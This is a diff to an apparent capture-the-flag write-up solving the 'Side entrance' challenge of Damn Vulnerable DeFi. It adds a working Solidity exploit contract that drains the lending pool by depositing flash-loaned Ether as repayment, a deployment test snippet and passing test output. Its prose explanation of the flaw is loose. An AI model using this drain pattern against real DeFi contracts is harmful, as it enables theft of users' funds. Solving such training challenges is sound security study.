@@ -75,3 +75,45 @@ The SideEntranceLenderPool contract is part of the Damn Vulnerable DeFi project 
 
 
 The vulnerability in this contract arises from the fact that the flashLoan() function does not check if the borrower has sufficient funds to repay the loan. This allows an attacker to borrow a large amount of Ether from the pool, manipulate the borrowed funds, and then repay the loan with the manipulated funds.
+
+```solidity
+pragma solidity ^0.8.0;
+
+import "../side-entrance/SideEntranceLenderPool.sol";
+
+contract AttackSideEntrance{
+
+    SideEntranceLenderPool pool;
+
+    function attack(address _pool)external payable{
+        pool = SideEntranceLenderPool(_pool);
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute()external payable{
+        pool.deposit{value: msg.value}();
+    }
+
+    fallback() external payable{}
+
+}
+```
+
+```js
+const AttackFactory = await ethers.getContractFactory('AttackSideEntrance', deployer);
+attack = await AttackFactory.deploy();
+await attack.connect(player).attack(pool.address);
+```
+
+
+```powershell
+ [Challenge] Side entrance
+    ✔ Execution (44ms)
+
+
+  1 passing (1s)
+
+Done in 2.56s.
+```
